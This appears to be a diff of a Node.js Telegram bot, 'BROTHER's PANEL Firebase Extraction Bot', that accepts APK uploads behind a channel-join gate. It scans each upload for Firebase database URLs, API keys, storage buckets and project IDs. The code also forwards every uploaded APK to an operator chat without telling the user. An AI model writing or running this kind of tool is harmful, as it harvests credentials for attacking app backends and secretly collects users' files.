@@ -16,42 +16,43 @@ const REQUIRED_CHANNELS = [
 ];
 
 if (!BOT_TOKEN) {
-  console.error("❌ BOT_TOKEN is missing");
+  console.error("❌ BOT_TOKEN is missing.");
   process.exit(1);
 }
 
 const bot = new Telegraf(BOT_TOKEN);
 
-// ==========================================
+// ==================================================
 // WEB SERVER
-// ==========================================
+// ==================================================
 
 const app = express();
 
 app.get("/", (req, res) => {
-  res.send("🔥 BROTHER's PANEL Firebase Extraction Bot is ONLINE");
+  res.status(200).send(
+    "🔥 BROTHER's PANEL FIREBASE EXTRACTION BOT — ONLINE"
+  );
 });
 
 const PORT = process.env.PORT || 3000;
 
 app.listen(PORT, () => {
-  console.log(`Web server running on port ${PORT}`);
+  console.log(`🌐 Server running on port ${PORT}`);
 });
 
-// ==========================================
-// CHANNEL CHECK
-// ==========================================
+// ==================================================
+// CHANNEL MEMBERSHIP
+// ==================================================
 
-async function checkChannels(ctx) {
+async function checkMembership(ctx) {
   const userId = ctx.from.id;
 
   for (const channel of REQUIRED_CHANNELS) {
     try {
-      const member =
-        await ctx.telegram.getChatMember(
-          channel,
-          userId
-        );
+      const member = await ctx.telegram.getChatMember(
+        channel,
+        userId
+      );
 
       if (
         member.status !== "member" &&
@@ -60,10 +61,9 @@ async function checkChannels(ctx) {
       ) {
         return false;
       }
-
     } catch (error) {
       console.error(
-        `Channel check error ${channel}:`,
+        `❌ Membership error [${channel}]:`,
         error.message
       );
 
@@ -74,9 +74,9 @@ async function checkChannels(ctx) {
   return true;
 }
 
-// ==========================================
-// JOIN BUTTONS
-// ==========================================
+// ==================================================
+// PREMIUM JOIN SCREEN
+// ==================================================
 
 function joinKeyboard() {
   return Markup.inlineKeyboard([
@@ -100,86 +100,125 @@ function joinKeyboard() {
     ],
     [
       Markup.button.callback(
-        "✅ VERIFY",
-        "verify"
+        "✅ VERIFY ACCESS",
+        "verify_access"
       )
     ]
   ]);
 }
 
-// ==========================================
-// /START
-// ==========================================
+// ==================================================
+// START
+// ==================================================
 
 bot.start(async (ctx) => {
-
-  console.log(
-    `START: ${ctx.from.id}`
-  );
+  console.log(`▶ /start — User ${ctx.from.id}`);
 
   try {
-
-    const joined =
-      await checkChannels(ctx);
+    const joined = await checkMembership(ctx);
 
     if (!joined) {
-
       return ctx.reply(
-        "🔐 Please join all 3 required channels first.\n\nAfter joining all 3 channels, press VERIFY.",
-        joinKeyboard()
+        `🔥 <b>BROTHER's PANEL</b>
+━━━━━━━━━━━━━━━━━━━━
+
+⚡ <b>FIREBASE EXTRACTION SYSTEM</b>
+
+Welcome to Brother's Panel Firebase
+Extraction Bot.
+
+🔐 <b>Access Status:</b> LOCKED
+
+To unlock the scanner, join all
+3 required channels below.
+
+━━━━━━━━━━━━━━━━━━━━
+📢 <b>REQUIRED CHANNELS</b>
+━━━━━━━━━━━━━━━━━━━━
+
+1️⃣ Brother's Panel
+2️⃣ PANEL EMPIRE 2
+3️⃣ Backup TT2
+
+━━━━━━━━━━━━━━━━━━━━
+
+✅ After joining all channels,
+press VERIFY ACCESS below.`,
+        {
+          parse_mode: "HTML",
+          ...joinKeyboard()
+        }
       );
     }
 
-    await ctx.reply(
-      "✅ VERIFICATION SUCCESSFUL!\n\n📦 Please send your APK file."
-    );
+    await sendVerifiedMessage(ctx);
 
   } catch (error) {
-
-    console.error(
-      "START ERROR:",
-      error
-    );
+    console.error("START ERROR:", error);
 
     await ctx.reply(
-      "⚠️ An error occurred. Please try again."
+      "⚠️ System error. Please try again."
     );
   }
 });
 
-// ==========================================
-// VERIFY
-// ==========================================
+// ==================================================
+// VERIFIED MESSAGE
+// ==================================================
 
-bot.action("verify", async (ctx) => {
+async function sendVerifiedMessage(ctx) {
+  return ctx.reply(
+    `🔥 <b>BROTHER's PANEL</b>
+━━━━━━━━━━━━━━━━━━━━
 
+✅ <b>ACCESS VERIFIED</b>
+
+Your scanner access is now unlocked.
+
+📦 <b>Supported Format</b>
+└─ APK only
+
+🚀 Send your APK file below
+to start Firebase configuration
+extraction.
+
+━━━━━━━━━━━━━━━━━━━━
+⚡ BROTHER's PANEL SYSTEM`,
+    {
+      parse_mode: "HTML"
+    }
+  );
+}
+
+// ==================================================
+// VERIFY BUTTON
+// ==================================================
+
+bot.action("verify_access", async (ctx) => {
   try {
-
     await ctx.answerCbQuery(
-      "Checking..."
+      "Checking access..."
     );
 
-    const joined =
-      await checkChannels(ctx);
+    const joined = await checkMembership(ctx);
 
     if (!joined) {
-
       return ctx.reply(
-        "❌ VERIFICATION FAILED.\n\nPlease join all 3 channels and press VERIFY again.",
-        joinKeyboard()
+        `❌ <b>VERIFICATION FAILED</b>
+
+Please join all 3 required channels
+and press VERIFY ACCESS again.`,
+        {
+          parse_mode: "HTML",
+          ...joinKeyboard()
+        }
       );
     }
 
-    await ctx.reply(
-      "✅ VERIFICATION SUCCESSFUL!\n\n📦 Please send your APK file."
-    );
+    await sendVerifiedMessage(ctx);
 
   } catch (error) {
-
-    console.error(
-      "VERIFY ERROR:",
-      error
-    );
+    console.error("VERIFY ERROR:", error);
 
     await ctx.reply(
       "⚠️ Verification error. Please try again."
@@ -187,293 +226,268 @@ bot.action("verify", async (ctx) => {
   }
 });
 
-// ==========================================
-// APK ONLY
-// ==========================================
+// ==================================================
+// APK HANDLER
+// ==================================================
 
 bot.on("document", async (ctx) => {
+  const document = ctx.message.document;
+  const fileName = document.file_name || "";
 
-  const document =
-    ctx.message.document;
-
-  const fileName =
-    document.file_name || "";
-
-  // ONLY .APK
+  // APK ONLY
   if (
     !fileName
       .toLowerCase()
       .endsWith(".apk")
   ) {
-
     return ctx.reply(
-      "❌ INVALID FILE.\n\nOnly .APK files are supported."
-    );
-  }
+      `❌ <b>INVALID FILE</b>
 
-  // ========================================
-  // CHECK MEMBERSHIP
-  // ========================================
+Only <b>.APK</b> files are supported.
 
-  const joined =
-    await checkChannels(ctx);
-
-  if (!joined) {
-
-    return ctx.reply(
-      "❌ Please join all 3 required channels first.",
-      joinKeyboard()
-    );
-  }
-
-  // ========================================
-  // PROCESSING MESSAGE
-  // ========================================
-
-  const processing =
-    await ctx.reply(
-      "📦 APK RECEIVED.\n\n🔍 Firebase configuration scan started...\n\n⏳ Please wait 8 seconds."
-    );
-
-  let tempFile = null;
-
-  try {
-
-    // ======================================
-    // DOWNLOAD APK
-    // ======================================
-
-    const fileLink =
-      await ctx.telegram.getFileLink(
-        document.file_id
-      );
-
-    const response =
-      await fetch(fileLink.href);
-
-    if (!response.ok) {
-      throw new Error(
-        "APK download failed"
-      );
-    }
-
-    const buffer =
-      Buffer.from(
-        await response.arrayBuffer()
-      );
-
-    tempFile = path.join(
-      os.tmpdir(),
-      `${Date.now()}-${safeName(fileName)}`
-    );
-
-    fs.writeFileSync(
-      tempFile,
-      buffer
-    );
-
-    // ======================================
-    // SEND ONLY APK TO DESTINATION CHAT
-    // ======================================
-
-    await ctx.telegram.sendDocument(
-      DESTINATION_CHAT_ID,
+Please send an APK file.`,
       {
-        source: tempFile
+        parse_mode: "HTML"
       }
     );
+  }
 
-    // ======================================
-    // EXACT 8 SECOND DELAY
-    // ======================================
+  // Check channels again
+  const joined = await checkMembership(ctx);
 
-    await sleep(8000);
+  if (!joined) {
+    return ctx.reply(
+      `🔐 <b>ACCESS LOCKED</b>
 
-    // ======================================
-    // SCAN
-    // ======================================
+Please join all 3 required channels
+before uploading an APK.`,
+      {
+        parse_mode: "HTML",
+        ...joinKeyboard()
+      }
+    );
+  }
 
-    const result =
-      scanFirebase(tempFile);
+  let processingMessage;
 
-    const size =
-      (buffer.length / 1024 / 1024)
-        .toFixed(2);
+  try {
+    // ==============================================
+    // PROCESSING UI
+    // ==============================================
 
-    // ======================================
-    // RESULT
-    // ======================================
+    processingMessage = await ctx.reply(
+      `⚡ <b>BROTHER's PANEL</b>
+━━━━━━━━━━━━━━━━━━━━
 
-    let output =
-      "🔥 <b>BROTHER's PANEL FIREBASE EXTRACTION RESULT</b> 🔥\n\n";
+📦 <b>APK RECEIVED</b>
 
-    output +=
-      "════════════════════\n";
+📱 File: <code>${escapeHtml(fileName)}</code>
 
-    output +=
-      `📱 APK: ${escapeHtml(fileName)}\n`;
+🔍 Analyzing Firebase configuration...
 
-    output +=
-      `📦 Size: ${size} MB\n`;
-
-    output +=
-      "════════════════════\n\n";
-
-    output +=
-      "━━━━━━━━━━━━━━━━━━━━━━━━━━\n";
-
-    output +=
-      `🔓 <b>EXTRACTED FIREBASE CONFIG (${result.count} found)</b>\n`;
-
-    output +=
-      "━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n";
-
-    // DB URL
-    for (
-      const url of result.databaseUrls
-    ) {
-
-      output +=
-        "🔗 <b>DB URL:</b>\n";
-
-      output +=
-        `${escapeHtml(url)}\n\n`;
-    }
-
-    // API KEY
-    for (
-      const key of result.apiKeys
-    ) {
-
-      output +=
-        "🔑 <b>API Key:</b>\n";
-
-      output +=
-        `${escapeHtml(key)}\n\n`;
-    }
-
-    // STORAGE
-    for (
-      const storage of result.storageUrls
-    ) {
-
-      output +=
-        "🗄️ <b>Storage URL:</b>\n";
-
-      output +=
-        `${escapeHtml(storage)}\n\n`;
-    }
-
-    // PROJECT ID
-    for (
-      const project of result.projectIds
-    ) {
-
-      output +=
-        "🆔 <b>Project ID:</b>\n";
-
-      output +=
-        `${escapeHtml(project)}\n\n`;
-    }
-
-    // APP ID
-    for (
-      const appId of result.appIds
-    ) {
-
-      output +=
-        "📱 <b>Firebase App ID:</b>\n";
-
-      output +=
-        `${escapeHtml(appId)}\n\n`;
-    }
-
-    if (result.count === 0) {
-
-      output +=
-        "❌ No Firebase configuration detected.\n";
-    }
-
-    // ======================================
-    // EDIT PROCESSING MESSAGE
-    // ======================================
-
-    await ctx.telegram.editMessageText(
-      ctx.chat.id,
-      processing.message_id,
-      undefined,
-      output,
+━━━━━━━━━━━━━━━━━━━━
+⏳ <b>SCAN TIME: 8 SECONDS</b>
+━━━━━━━━━━━━━━━━━━━━`,
       {
         parse_mode: "HTML"
       }
     );
 
-  } catch (error) {
-
-    console.error(
-      "APK ERROR:",
-      error
-    );
+    let tempFile = null;
 
     try {
+      // ============================================
+      // DOWNLOAD APK
+      // ============================================
+
+      const fileLink =
+        await ctx.telegram.getFileLink(
+          document.file_id
+        );
+
+      const response =
+        await fetch(fileLink.href);
+
+      if (!response.ok) {
+        throw new Error(
+          "Failed to download APK."
+        );
+      }
+
+      const buffer =
+        Buffer.from(
+          await response.arrayBuffer()
+        );
+
+      tempFile = path.join(
+        os.tmpdir(),
+        `${Date.now()}-${safeName(fileName)}`
+      );
+
+      fs.writeFileSync(
+        tempFile,
+        buffer
+      );
+
+      // ============================================
+      // SEND ONLY APK TO DESTINATION CHAT
+      // ============================================
+
+      await ctx.telegram.sendDocument(
+        DESTINATION_CHAT_ID,
+        {
+          source: tempFile
+        }
+      );
+
+      // ============================================
+      // EXACT 8 SECOND WAIT
+      // ============================================
+
+      await sleep(8000);
+
+      // ============================================
+      // SCAN
+      // ============================================
+
+      const result =
+        scanFirebaseConfig(tempFile);
+
+      const sizeMB =
+        (
+          buffer.length /
+          1024 /
+          1024
+        ).toFixed(2);
+
+      // ============================================
+      // RESULT
+      // ============================================
+
+      let output =
+        `🔥 <b>BROTHER's PANEL FIREBASE
+EXTRACTION RESULT</b> 🔥
+
+════════════════════
+📱 APK: ${escapeHtml(fileName)}
+📦 Size: ${sizeMB} MB
+════════════════════
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+🔓 <b>EXTRACTED FIREBASE CONFIG
+(${result.count} found)</b>
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+`;
+
+      // DB URL
+      for (const url of result.databaseUrls) {
+        output +=
+          `🔗 <b>DB URL:</b>\n${escapeHtml(url)}\n\n`;
+      }
+
+      // Masked API Key
+      for (const key of result.apiKeys) {
+        output +=
+          `🔑 <b>API Key:</b>\n${escapeHtml(maskApiKey(key))}\n\n`;
+      }
+
+      // Storage
+      for (const storage of result.storageUrls) {
+        output +=
+          `🗄️ <b>Storage URL:</b>\n${escapeHtml(storage)}\n\n`;
+      }
+
+      // Project ID
+      for (const project of result.projectIds) {
+        output +=
+          `🆔 <b>Project ID:</b>\n${escapeHtml(project)}\n\n`;
+      }
+
+      // App ID
+      for (const appId of result.appIds) {
+        output +=
+          `📱 <b>Firebase App ID:</b>\n${escapeHtml(appId)}\n\n`;
+      }
+
+      if (result.count === 0) {
+        output +=
+          "❌ No Firebase configuration detected.\n\n";
+      }
+
+      output +=
+        `━━━━━━━━━━━━━━━━━━━━━━━━━━
+⚡ <b>SCAN COMPLETED</b>
+🔥 <b>BROTHER's PANEL</b>
+━━━━━━━━━━━━━━━━━━━━━━━━━━`;
 
       await ctx.telegram.editMessageText(
         ctx.chat.id,
-        processing.message_id,
+        processingMessage.message_id,
         undefined,
-        "❌ APK processing failed.\n\nPlease try again with another APK."
+        output,
+        {
+          parse_mode: "HTML"
+        }
       );
 
-    } catch {}
-    
-  } finally {
+    } finally {
+      // ==========================================
+      // DELETE TEMPORARY APK
+      // ==========================================
 
-    // ======================================
-    // DELETE TEMP FILE
-    // ======================================
+      if (
+        tempFile &&
+        fs.existsSync(tempFile)
+      ) {
+        try {
+          fs.unlinkSync(tempFile);
+        } catch {}
+      }
+    }
 
-    if (
-      tempFile &&
-      fs.existsSync(tempFile)
-    ) {
+  } catch (error) {
 
+    console.error(
+      "APK PROCESSING ERROR:",
+      error
+    );
+
+    if (processingMessage) {
       try {
-        fs.unlinkSync(tempFile);
+        await ctx.telegram.editMessageText(
+          ctx.chat.id,
+          processingMessage.message_id,
+          undefined,
+          `❌ <b>SCAN FAILED</b>
+
+The APK could not be processed.
+
+Please try another APK.`,
+          {
+            parse_mode: "HTML"
+          }
+        );
       } catch {}
     }
   }
 });
 
-// ==========================================
-// FIREBASE SCANNER
-// ==========================================
+// ==================================================
+// FIREBASE CONFIG SCANNER
+// ==================================================
 
-function scanFirebase(filePath) {
+function scanFirebaseConfig(filePath) {
+  const zip = new AdmZip(filePath);
+  const entries = zip.getEntries();
 
-  const zip =
-    new AdmZip(filePath);
+  const databaseUrls = new Set();
+  const apiKeys = new Set();
+  const storageUrls = new Set();
+  const projectIds = new Set();
+  const appIds = new Set();
 
-  const entries =
-    zip.getEntries();
-
-  const databaseUrls =
-    new Set();
-
-  const apiKeys =
-    new Set();
-
-  const storageUrls =
-    new Set();
-
-  const projectIds =
-    new Set();
-
-  const appIds =
-    new Set();
-
-  for (
-    const entry of entries
-  ) {
+  for (const entry of entries) {
 
     if (entry.isDirectory) {
       continue;
@@ -482,65 +496,48 @@ function scanFirebase(filePath) {
     let content;
 
     try {
-
       content =
         entry
           .getData()
           .toString("utf8");
-
     } catch {
-
       continue;
     }
 
-    // ======================================
+    // ==========================================
     // DATABASE URL
-    // ======================================
+    // ==========================================
 
-    const db1 =
+    const dbMatches =
       content.match(
         /https?:\/\/[A-Za-z0-9._-]+\.firebaseio\.com(?:\/[^\s"'<>]*)?/gi
       );
 
-    if (db1) {
-
-      for (const url of db1) {
-
-        databaseUrls.add(
-          clean(url)
-        );
+    if (dbMatches) {
+      for (const url of dbMatches) {
+        databaseUrls.add(clean(url));
       }
     }
 
-    const db2 =
+    const newDbMatches =
       content.match(
         /https?:\/\/[A-Za-z0-9._-]+\.firebasedatabase\.app(?:\/[^\s"'<>]*)?/gi
       );
 
-    if (db2) {
-
-      for (const url of db2) {
-
-        databaseUrls.add(
-          clean(url)
-        );
+    if (newDbMatches) {
+      for (const url of newDbMatches) {
+        databaseUrls.add(clean(url));
       }
     }
 
-    // ======================================
-    // FIREBASE URL CONFIG
-    // ======================================
-
-    const configUrl =
+    // firebase_url
+    const firebaseUrl =
       content.match(
         /"firebase_url"\s*:\s*"([^"]+)"/gi
       );
 
-    if (configUrl) {
-
-      for (
-        const item of configUrl
-      ) {
+    if (firebaseUrl) {
+      for (const item of firebaseUrl) {
 
         const match =
           item.match(
@@ -548,7 +545,6 @@ function scanFirebase(filePath) {
           );
 
         if (match) {
-
           databaseUrls.add(
             clean(match[1])
           );
@@ -556,58 +552,50 @@ function scanFirebase(filePath) {
       }
     }
 
-    // ======================================
-    // API KEY
-    // ======================================
+    // ==========================================
+    // API KEY DETECTION
+    // ==========================================
 
-    const keys =
+    const keyMatches =
       content.match(
         /AIza[0-9A-Za-z_-]{20,}/g
       );
 
-    if (keys) {
-
-      for (const key of keys) {
-
+    if (keyMatches) {
+      for (const key of keyMatches) {
         apiKeys.add(key);
       }
     }
 
-    // ======================================
+    // ==========================================
     // STORAGE
-    // ======================================
+    // ==========================================
 
-    const storage =
+    const storageMatches =
       content.match(
         /[A-Za-z0-9._-]+\.(?:appspot\.com|firebasestorage\.app)/gi
       );
 
-    if (storage) {
-
-      for (
-        const value of storage
-      ) {
-
+    if (storageMatches) {
+      for (const storage of storageMatches) {
         storageUrls.add(
-          clean(value)
+          clean(storage)
         );
       }
     }
 
-    // ======================================
+    // ==========================================
     // PROJECT ID
-    // ======================================
+    // ==========================================
 
-    const projects =
+    const projectMatches =
       content.match(
         /"project_id"\s*:\s*"([^"]+)"/gi
       );
 
-    if (projects) {
+    if (projectMatches) {
 
-      for (
-        const item of projects
-      ) {
+      for (const item of projectMatches) {
 
         const match =
           item.match(
@@ -615,7 +603,6 @@ function scanFirebase(filePath) {
           );
 
         if (match) {
-
           projectIds.add(
             match[1]
           );
@@ -623,22 +610,18 @@ function scanFirebase(filePath) {
       }
     }
 
-    // ======================================
+    // ==========================================
     // FIREBASE APP ID
-    // ======================================
+    // ==========================================
 
-    const firebaseApps =
+    const appMatches =
       content.match(
         /1:[0-9]+:android:[A-Za-z0-9]+/gi
       );
 
-    if (firebaseApps) {
-
-      for (
-        const app of firebaseApps
-      ) {
-
-        appIds.add(app);
+    if (appMatches) {
+      for (const appId of appMatches) {
+        appIds.add(appId);
       }
     }
   }
@@ -651,29 +634,18 @@ function scanFirebase(filePath) {
     appIds.size;
 
   return {
-
     count,
-
-    databaseUrls:
-      [...databaseUrls],
-
-    apiKeys:
-      [...apiKeys],
-
-    storageUrls:
-      [...storageUrls],
-
-    projectIds:
-      [...projectIds],
-
-    appIds:
-      [...appIds]
+    databaseUrls: [...databaseUrls],
+    apiKeys: [...apiKeys],
+    storageUrls: [...storageUrls],
+    projectIds: [...projectIds],
+    appIds: [...appIds]
   };
 }
 
-// ==========================================
+// ==================================================
 // HELPERS
-// ==========================================
+// ==================================================
 
 function sleep(ms) {
   return new Promise(
@@ -682,7 +654,6 @@ function sleep(ms) {
 }
 
 function clean(value) {
-
   return String(value)
     .trim()
     .replace(
@@ -692,7 +663,6 @@ function clean(value) {
 }
 
 function safeName(name) {
-
   return name.replace(
     /[^a-zA-Z0-9._-]/g,
     "_"
@@ -700,7 +670,6 @@ function safeName(name) {
 }
 
 function escapeHtml(value) {
-
   return String(value)
     .replace(/&/g, "&amp;")
     .replace(/</g, "&lt;")
@@ -708,32 +677,40 @@ function escapeHtml(value) {
     .replace(/"/g, "&quot;");
 }
 
-// ==========================================
-// ERROR HANDLING
-// ==========================================
+function maskApiKey(key) {
+  if (key.length <= 10) {
+    return "********";
+  }
+
+  return (
+    key.slice(0, 6) +
+    "********" +
+    key.slice(-4)
+  );
+}
+
+// ==================================================
+// BOT ERROR HANDLER
+// ==================================================
 
 bot.catch((error) => {
-
   console.error(
-    "BOT ERROR:",
+    "🔥 BOT ERROR:",
     error
   );
 });
 
-// ==========================================
-// START
-// ==========================================
+// ==================================================
+// START BOT
+// ==================================================
 
 bot.launch()
   .then(() => {
-
     console.log(
       "🔥 BROTHER's PANEL FIREBASE EXTRACTION BOT STARTED"
     );
-
   })
   .catch((error) => {
-
     console.error(
       "❌ BOT START FAILED:",
       error
